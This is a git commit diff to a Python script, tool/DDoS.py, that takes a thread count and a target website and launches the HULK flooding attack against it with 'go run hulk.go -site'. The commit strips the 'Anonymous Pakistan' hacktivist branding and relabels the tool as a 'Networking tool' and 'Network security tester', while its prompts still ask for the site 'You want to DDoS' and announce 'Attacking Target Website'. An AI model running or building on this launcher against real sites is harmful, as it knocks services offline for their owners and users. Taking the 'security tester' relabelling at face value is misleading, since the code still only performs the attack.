72a33adab4d66833e0c758aede6fa1ee0b994f07
Chai <83523587+CPScript@users.noreply.github.com>
2023-03-17 10:28:49 -0400

    Update DDoS.py

--- tool/DDoS.py
+++ tool/DDoS.py
@@ -1,13 +1,4 @@
 from colorama import Fore, Back, Style
-from platform import platform
-puk = platform()[0], platform()[1],  platform()[2], platform()[3], platform()[4], platform()[5], platform()[6]
-
-if puk == ('W', 'i', 'n', 'd', 'o', 'w', 's'):
-    delet = 'cls'
-    dr = '\\'
-else:
-    delet = 'clear'
-from colorama import Fore, Back, Style
 #print(Fore.RED + 'some red text')
 #print(Back.GREEN + 'and with a green background')
 #print(Style.DIM + 'and in dim text')
@@ -38,12 +29,12 @@ def say_stuff(stuff_to_say):
     engine.runAndWait()
 print(Fore.GREEN)
 if str(platform.system()) == 'Linux':
-    os.system('figlet AnonymousPAK DDoS Attack')
+    os.system('figlet Anonymous DDoS Attack')
 else:
-    os.system('pyfiglet AnonymousPAK  DDoS Attack')
+    os.system('pyfiglet Anonymous  DDoS Attack')
   
 os.system(delet)
-print(Fore.YELLOW + '[+] We are Anonymous, We are a Legion, We do not Forgive, We do not Forget')
+print(Fore.YELLOW + '[+] Network security tester, ment for persinal uses only')
 time.sleep(5)
 # Logo
 os.system(delet)
@@ -84,17 +75,17 @@ print("""
                ██║   ██║██╔══██╗██╔══██╗██║   ██║                                                   
                ╚██████╔╝██║  ██║██████╔╝██║   ██║                                                   
                 ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝   ╚═╝                                                   
-                DDoS tool                                                                           
+                Networking tool                                                                           
 """)
 
 time.sleep(1)
 print('Your OS:'+ Fore.RED + str(platform.system())+Fore.GREEN)
 print("Your IP:" + IPAddr)
-print(Fore.BLACK + '[+] Orbit-DDoS Tool VERSION 1.3         ')
+print(Fore.BLACK + '[+] Orbit-Tool VERSION 1.3         ')
 print("|===========================================================================|")
 time.sleep(2)
 print("                                                                          ")
-print(Fore.GREEN + '[+] DDoS Tool starts with 1024 Baseline Threads as Default, change below is Required           ')
+print(Fore.GREEN + '[+] Tool starts with 1024 Baseline Threads as Default, change below is Required           ')
 try:
     threads = input('[+] ENTER THE NUMBER OF' + Fore.BLUE + ' THREADS ' + Fore.GREEN + 'FOR DDoS >>>')
     site = input(Fore.BLUE + '[+] Enter the Site that You want to' + Fore.RED + ' DDoS ' + Fore.GREEN + '>>>')
@@ -108,12 +99,12 @@ try:
         if str(platform.system()) == 'Linux':
             print('[+] As You are on Linux, No, Text-to-Speech')
         else:
-            say_stuff("Attacking your Target Website {0} with {1} Threads".format(site, threads))
+            say_stuff("Attacking Target Website {0} with {1} Threads".format(site, threads))
     if 'N' == colab_status:
         if str(platform.system()) == 'Linux':
             print('[+] As you are on Linux, No, Text-to-Speech')
         else:
-            say_stuff("Attacking your Target Website {0} with {1} Threads".format(site, threads))
+            say_stuff("Attacking Target Website {0} with {1} Threads".format(site, threads))
 
     print('[+] Executing Command as Follows')
     print(Fore.GREEN +'HULKMAXPROCS={0} go run hulk.go -site {1}'.format(threads,site))
@@ -135,7 +126,6 @@ except:
 print(" ")    
 print(" ")    
 print(" ")
-print(Fore.GREEN +'[+] Anonymous DDoS tool by' + Fore.RED + ' Anonymous Pakistan Community                              ') 
-print(Fore.GREEN + '[+] Orbit-DDoS Tool made in Python by CPScript                      ')
+print(Fore.GREEN + '[+] Orbit-Tool made in Python by CPScript                      ')
 print(Fore.RED + '[+] Youtube: ' + Fore.GREEN + 'https://www.youtube.com/channel/UCpMPWg0TXBINqpCTeol4Yhg')
 print(Fore.YELLOW + '[+] GitHub: ' + Fore.GREEN + 'CPScript')
